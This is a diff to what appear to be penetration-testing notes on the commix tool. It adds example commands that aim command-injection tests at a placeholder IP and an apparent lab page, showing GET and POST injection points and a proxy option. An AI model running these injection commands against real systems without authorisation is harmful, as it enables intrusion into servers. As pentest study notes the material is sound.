@@ -9,6 +9,18 @@ Load from saved file (contains cookies, tokens, etc)
 ```bash
 commix -r /must/use/full/path/to/file.txt
 ```
+Examples
+---------
+```bash
+# Notice the "INJECT_HERE" param
+commix -u 'http://xxx.xxx.xxx.xxx/commandexec/example2.php?ip=127.0.0.1INJECT_HERE'--os=unix --batch 
+# Use proxy to make sure you are doing what you think you are
+commix -u 'http://xxx.xxx.xxx.xxx/commandexec/example2.php?ip=127.0.0.1INJECT_HERE'--os=unix --batch --proxy=http://localhost:8080
+# --data is used for POST and adds the data to the body, not the url
+commix -u 'http://xxx.xxx.xxx.xxx/commandexec/example2.php' --data=ip="INJECT_HERE" --os=unix --batch --proxy=http://localhost:8080
+```
+
+
 Technique 1
 -----------
 ```bash
